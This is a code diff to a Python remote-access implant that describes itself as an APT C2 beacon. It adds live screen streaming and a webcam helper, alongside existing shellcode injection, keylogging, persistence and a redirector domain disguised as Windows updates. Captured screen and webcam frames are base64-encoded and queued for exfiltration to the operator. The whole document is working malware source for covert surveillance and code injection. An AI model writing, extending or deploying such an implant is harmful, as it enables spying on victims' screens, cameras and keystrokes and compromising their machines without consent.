@@ -1,4 +1,4 @@
-# implant.py - Python APT Implant (Stealthy C2 Beacon)
+# implant.py - Python APT Implant 
 # Feasibility prototype mirroring Go version capabilities
 # Features: Beaconing w/ jitter & UA rotation, AES-GCM comms, persistence,
 #           screenshot (mss), webcam (opencv), mic (pyaudio), keylogger (keyboard/pywin32),
@@ -35,6 +35,10 @@ REDIRECTOR_URL = "https://windows-updates.vercel.app/"
 c2_url = ""                     # Dynamic — resolved at runtime
 c2_fetch_backoff = 60.0         # seconds, float for easy *=
 pending_results = []
+screen_streaming = False
+stream_active = False
+stream_lock = threading.Lock()
+stream_thread = None
 results_lock = threading.Lock()
 
 BEACON_KEY = b"0123456789abcdef0123456789abcdef"  # 32-byte key, match server
@@ -176,6 +180,42 @@ def inject_shellcode(pid: int, sc: bytes):
     th = kernel32.CreateRemoteThread(ph, None, 0, alloc, 0, 0, None)
     return f"Injected into PID {pid}" if th else "CreateRemoteThread failed"
 
+
+def get_camera():
+    # Try indices 0 through 2
+    for i in range(3):
+        cap = cv2.VideoCapture(i, cv2.CAP_DSHOW) # Use DSHOW for faster init on Windows
+        if cap.isOpened():
+            return cap
+    return None
+    
+
+def screen_stream_worker(duration):
+    global screen_streaming
+    screen_streaming = True
+    start_time = time.time()
+    with mss.mss() as sct:
+        while screen_streaming:
+            if duration > 0 and (time.time() - start_time) > duration:
+                break
+            
+            # Capture monitor 1
+            img = sct.grab(sct.monitors[1])
+            img_bytes = mss.tools.to_png(img.rgb, img.size)
+            
+            # Convert to JPEG to save bandwidth
+            frame = cv2.imdecode(np.frombuffer(img_bytes, np.uint8), cv2.IMREAD_COLOR)
+            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
+            
+            b64_chunk = base64.b64encode(buffer).decode()
+            with results_lock:
+                pending_results.append({
+                    "task_id": "screen_live",
+                    "output": f"SCREEN_STREAM_CHUNK:{b64_chunk}"
+                })
+            time.sleep(0.5) # ~2 FPS for stability
+    screen_streaming = False
+
 # ===================== MAIN BEACON LOOP =====================
 implant_id = generate_implant_id()
 hostname = os.getenv("COMPUTERNAME")
@@ -269,13 +309,20 @@ def main():
             pass
         time.sleep(get_jittered_sleep())
 # ===================== NEW: REVERSE WEBCAM STREAM =====================
-stream_active = False
-stream_lock = threading.Lock()
-stream_thread = None
 
 def webcam_stream_worker(duration: int):
     """Capture webcam frames and push as multipart chunks via beacon results"""
     global stream_active
+    global webcam_streaming
+    webcam_streaming = True
+    cap = get_camera()
+    
+    if cap is None:
+        with results_lock:
+            pending_results.append({"task_id": "webcam_live", "error": "No camera found"})
+        webcam_streaming = False
+        stream_active = False
+        return
     cap = cv2.VideoCapture(0)
     if not cap.isOpened():
         return
@@ -305,7 +352,7 @@ def webcam_stream_worker(duration: int):
         # Immediate exfil as result (no wait for next beacon)
         result = {
             "task_id": f"webcam_stream_chunk_{chunk_id}",
-            "output": f"WEBCAM_STREAM_CHUNK:{base64.b64encode(part).decode()}"
+            "output": f"SWEBCAM_STREAM_CHUNK:{base64.b64encode(part).decode()}"
         }
         with results_lock:
             pending_results.append(result)
@@ -317,7 +364,7 @@ def webcam_stream_worker(duration: int):
     # Final chunk marker
     final = {
         "task_id": "webcam_stream_end",
-        "output": "WEBCAM_STREAM_END"
+        "output": "SWEBCAM_STREAM_END"
     }
     with results_lock:
         pending_results.append(final)
@@ -396,10 +443,10 @@ def handle_task(task):
 
             if action == "start":
                 msg = start_webcam_stream(duration)
-                result["output"] = f"WEBCAM_STREAM_STATUS:{msg}"
+                result["output"] = f"SWEBCAM_STREAM_STATUS:{msg}"
             elif action == "stop":
                 msg = stop_webcam_stream()
-                result["output"] = f"WEBCAM_STREAM_STATUS:{msg}"
+                result["output"] = f"SWEBCAM_STREAM_STATUS:{msg}"
         elif ttype == "keylog":
             if cmd == "start":
                 start_keylogger()
